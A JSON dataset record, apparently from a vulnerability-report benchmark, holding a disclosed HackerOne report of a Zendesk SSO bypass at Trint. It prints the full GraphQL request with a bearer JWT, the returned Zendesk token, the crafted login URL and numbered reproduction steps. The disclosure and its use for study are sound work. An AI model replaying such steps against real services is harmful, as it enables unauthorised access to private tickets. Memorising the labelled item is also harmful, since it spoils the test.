@@ -1,0 +1,56 @@
+{
+    "reported_to": "Trint Ltd",
+    "reported_by": "sopankbegitu ",
+    "title": "SSO bypass in zendesk using trint organization able to leak internal ticket information",
+    "content": "\nSummary\nhello there because in app.trint.com there's no email verification i able to login in your zendesk SSO using your organization\nyour organization using domain *@trint.com because there's no email verification i able to read and takeover + claim this email\nsupport+1@trint.com and i able to login in zendesk SSO using that email.\nHow to reproduce\ni registered in app.trint.com using this email support+1@trint.com until registration step finish\ni check my burp history there's a graphql request in this host https://graphql2.trint.com/\ni use this query\nCode 1.09 KiB\n1POST / HTTP/1.1\n2Host: graphql2.trint.com\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://app.trint.com/\n8content-type: application/json\n9Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU\n10X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b\n11X-Trint-Super-Properties: {}\n12Origin: https://app.trint.com\n13Content-Length: 111\n14Connection: close\n15\n16{\"operationName\":null,\"variables\":{\"status\":\"PENDING\"},\"query\":\"query zendeskToken {\\n    zendeskToken\\n  }\\n\"}\nHTTP/1.1 200 OK\n\n{\"data\":{\"zendeskToken\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM\"}}\nCode 527 Bytes\n1\n2* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM`\n3\n4* boom logged in in ticket using email `support+1@trint.com`\n5\n6#POC\n7\n8{F631462}\n9\n10## Impact\n11\n12#Impact\n13* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`\n\n",
+    "severity": [
+        8.1,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Improper Authentication - Generic"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1598298180,
+    "report_url": "https://hackerone.com/reports/734936",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Register on app.trint.com using an email with the @trint.com domain (e.g., support+1@trint.com) without email verification."
+        ],
+        [
+            2,
+            "Intercept the GraphQL request to https://graphql2.trint.com/ using a tool like Burp Suite to extract the JWT token for Zendesk SSO."
+        ],
+        [
+            3,
+            "Craft a URL to access Zendesk SSO with the extracted JWT token: https://trintsupport.zendesk.com/access/jwt?jwt=<token>."
+        ],
+        [
+            4,
+            "Access internal ticket information via https://support.trint.com/hc/en-us/requests/organization."
+        ]
+    ],
+    "vuln_description": "This vulnerability allows an attacker to bypass SSO in Zendesk by registering with a @trint.com email (without verification) and extracting a JWT token from GraphQL requests. The attacker can then use this token to log in to Zendesk and access internal ticket information.",
+    "reason": "The attack involves multiple components (registration, GraphQL interception, JWT token extraction, and SSO bypass) and requires understanding the interaction between these components. However, the steps are straightforward once the initial registration flaw is identified.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": false,
+        "authnz_byppass_detectable": true
+    }
+}
